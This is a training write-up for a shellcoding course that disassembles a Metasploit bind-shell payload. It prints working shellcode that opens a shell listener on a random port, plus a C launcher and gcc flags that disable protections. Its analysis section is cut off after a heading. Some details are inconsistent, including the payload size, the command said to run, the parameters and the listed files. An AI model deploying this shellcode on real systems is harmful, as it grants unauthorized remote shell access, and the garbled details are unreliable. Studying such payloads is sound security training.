## Assignment #5.1: Shellcode `linux/x64/shell_bind_tcp_random_port` Dissection
---
---
### Introduction
---
The first `msfvenom` shellcode that is going to be dissected in functionality is the `linux/x64/shell_bind_tcp_random_port` payload.

Let's see it's options:
```bash
SLAE64>  msfvenom -p linux/x64/shell_bind_tcp_random_port --list-options
Options for payload/linux/x64/shell_bind_tcp_random_port:
=========================


       Name: Linux Command Shell, Bind TCP Random Port Inline
     Module: payload/linux/x64/shell_bind_tcp_random_port
   Platform: Linux
       Arch: x64
Needs Admin: No
 Total size: 57
       Rank: Normal

Provided by:
    Geyslan G. Bem <geyslan@gmail.com>

Description:
  Listen for a connection in a random port and spawn a command shell. 
  Use nmap to discover the open port: 'nmap -sS target -p-'.
```

The payload is only 78 bytes and it requires the following parameters:
- `LPORT`: The port to listen for the incoming connection
- `RHOST`: The target address

### Creating the Shellcode
---
Will execute the `ls -l` command. Decided to use a command that can receive options to check how the payload handles it. Also added the full path to make the command string a 7 bytes length only. Let's generate the payload:
```c
SLAE64> msfvenom -p linux/x64/shell_bind_tcp_random_port -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 57 bytes
Final size of c file: 264 bytes
unsigned char buf[] = 
"\x48\x31\xf6\x48\xf7\xe6\xff\xc6\x6a\x02\x5f\xb0\x29\x0f\x05"
"\x52\x5e\x50\x5f\xb0\x32\x0f\x05\xb0\x2b\x0f\x05\x57\x5e\x48"
"\x97\xff\xce\xb0\x21\x0f\x05\x75\xf8\x52\x48\xbf\x2f\x2f\x62"
"\x69\x6e\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x0f\x05";
SLAE64> 
```
The generated payload size, this time did not change in size.

### Run Shellcode. The C Template
---
To run the shellcode, will use of the `shellcode.c` template renamoed to `Payload_02.c`. The shellcode is placed in the `code[]` string:
```c
#include <stdio.h>
#include <string.h>

unsigned char code[]= \
"\x48\x31\xf6\x48\xf7\xe6\xff\xc6\x6a\x02\x5f\xb0\x29\x0f\x05"
"\x52\x5e\x50\x5f\xb0\x32\x0f\x05\xb0\x2b\x0f\x05\x57\x5e\x48"
"\x97\xff\xce\xb0\x21\x0f\x05\x75\xf8\x52\x48\xbf\x2f\x2f\x62"
"\x69\x6e\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x0f\x05";

void main()
{
        printf("ShellCode Lenght: %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
```
Now it can be compiled:
```bash
gcc -fno-stack-protector -z execstack Payload_02.c -o Payload_02
```
When it's run, is listens for incoming connections in a random port. From another terminal using `netstat` check what's the listening port, and with `netcat`, can connect. A shell is spawned:

<img src="https://galminyana.github.io/img/A052_Shellcode_Run.png" width="75%" height="75%">

### `objdump`: First Approach
---
Once we get the executable, will use `objdump` to disassemble the ASM code. As `objdump` disassembles the code by sections, the one of interest is the `<code>` section. Is the one containing the payload shellcode:

```asm
SLAE64> objdump -M intel -D Payload_02
**_REMOVED_**
0000000000004060 <code>:
    4060:	48 31 f6             	xor    rsi,rsi
    4063:	48 f7 e6             	mul    rsi
    4066:	ff c6                	inc    esi
    4068:	6a 02                	push   0x2
    406a:	5f                   	pop    rdi
    406b:	b0 29                	mov    al,0x29
    406d:	0f 05                	syscall 
    406f:	52                   	push   rdx
    4070:	5e                   	pop    rsi
    4071:	50                   	push   rax
    4072:	5f                   	pop    rdi
    4073:	b0 32                	mov    al,0x32
    4075:	0f 05                	syscall 
    4077:	b0 2b                	mov    al,0x2b
    4079:	0f 05                	syscall 
    407b:	57                   	push   rdi
    407c:	5e                   	pop    rsi
    407d:	48 97                	xchg   rdi,rax
    407f:	ff ce                	dec    esi
    4081:	b0 21                	mov    al,0x21
    4083:	0f 05                	syscall 
    4085:	75 f8                	jne    407f <code+0x1f>
    4087:	52                   	push   rdx
    4088:	48 bf 2f 2f 62 69 6e 	movabs rdi,0x68732f6e69622f2f
    408f:	2f 73 68 
    4092:	57                   	push   rdi
    4093:	54                   	push   rsp
    4094:	5f                   	pop    rdi
    4095:	b0 3b                	mov    al,0x3b
    4097:	0f 05                	syscall 
	...
**_REMOVED_**
SLAE64> 
```
Per the disassembled code, a total of 5 syscalls been used. Let's see which ones are for the values of RAX before `syscall` instruction:
- `sys_socket` : Value 0x29
- `sys_listen` : Value 0x32
- `sys_accept` : Value 0x2b
- `sys_dup2`   : Value 0x21
- `sys_execve` : Value 0x3b

### The Fun: GDB Analysis
---
As how the shellcode is disasembled, the code can be divided in sections. This sections are defined by the different syscalls. To simplify the analysis, we going to debug section by section.

Let's load the exec file into `gdb`, setup the environment, and place a breakpoint in the code section with `b *&code`:

```asm
SLAE64> gdb ./Payload_02
GNU gdb (Debian 8.2.1-2+b3) 8.2.1
Reading symbols from ./Payload_02...(no debugging symbols found)...done.
(gdb) 
(gdb) set disassembly-flavor intel
(gdb) b *&code
Breakpoint 1 at 0x4060
(gdb) 
```
Now can start debugging, let's `run` the program and `disassemble` it:
```asm
(gdb) run
Starting program: /root/SLAE64/Exam/Assignment05/Payload_02 
ShellCode Lenght: 57

Breakpoint 1, 0x0000555555558060 in code ()
(gdb) disassemble 
Dump of assembler code for function code:
=> 0x0000555555558060 <+0>:	xor    rsi,rsi
   0x0000555555558063 <+3>:	mul    rsi
   0x0000555555558066 <+6>:	inc    esi
   0x0000555555558068 <+8>:	push   0x2
   0x000055555555806a <+10>:	pop    rdi
   0x000055555555806b <+11>:	mov    al,0x29
   0x000055555555806d <+13>:	syscall 
   0x000055555555806f <+15>:	push   rdx
   0x0000555555558070 <+16>:	pop    rsi
   0x0000555555558071 <+17>:	push   rax
   0x0000555555558072 <+18>:	pop    rdi
   0x0000555555558073 <+19>:	mov    al,0x32
   0x0000555555558075 <+21>:	syscall 
   0x0000555555558077 <+23>:	mov    al,0x2b
   0x0000555555558079 <+25>:	syscall 
   0x000055555555807b <+27>:	push   rdi
   0x000055555555807c <+28>:	pop    rsi
   0x000055555555807d <+29>:	xchg   rdi,rax
   0x000055555555807f <+31>:	dec    esi
   0x0000555555558081 <+33>:	mov    al,0x21
   0x0000555555558083 <+35>:	syscall 
   0x0000555555558085 <+37>:	jne    0x55555555807f <code+31>
   0x0000555555558087 <+39>:	push   rdx
   0x0000555555558088 <+40>:	movabs rdi,0x68732f6e69622f2f
   0x0000555555558092 <+50>:	push   rdi
   0x0000555555558093 <+51>:	push   rsp
   0x0000555555558094 <+52>:	pop    rdi
   0x0000555555558095 <+53>:	mov    al,0x3b
   0x0000555555558097 <+55>:	syscall 
   0x0000555555558099 <+57>:	add    BYTE PTR [rax],al
End of assembler dump.
(gdb) 
```
All looks good, let's dissect the functionality.

#### Section 1: `sys_socket`
















### GitHub Repo Files
---
The [GitHub Repo](https://github.com/galminyana/SLAE64/tree/main/Assignment05) for this assignment contains the following files:

- [Payload_01.c](https://github.com/galminyana/SLAE64/blob/main/Assignment05/Payload_01.c) : The C file cloned from `shellcode.c` to execute the `linux/x64/exec` shellcode.
- [Shellcode_01.txt](https://github.com/galminyana/SLAE64/blob/main/Assignment05/Shellcode_01.txt) : The rax shellcode in hex into a text file.

### The End
---
This pages have been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html).

Student ID: PA-14628
 
